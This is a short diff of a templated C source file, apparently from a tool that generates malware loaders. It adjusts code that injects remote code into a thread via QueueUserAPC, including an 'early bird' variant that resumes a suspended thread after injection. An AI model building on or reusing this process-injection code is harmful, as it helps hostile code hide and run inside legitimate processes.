@@ -2,6 +2,8 @@
 
 {% if section == "globals" %}
     {{ function_typedef("QueueUserAPC") }}
+    {{ function_typedef("ResumeThread") }}
+
     {% if link.early_bird %}
         {{ function_typedef("ResumeThread") }}
     {% else %}
@@ -10,11 +12,11 @@
 
     int inject(HANDLE hThread, void *pRemoteCode){
         {{ function_definition("QueueUserAPC") }}
-        
+
         return pQueueUserAPC((PAPCFUNC)pRemoteCode, hThread, NULL);
     }
 {% else %}
-    {% if link.early_bird %}
+    {% if early_bird %}
         {{ function_definition("ResumeThread") }}
         inject(hThread, mem);
         pResumeThread(pi.hThread);
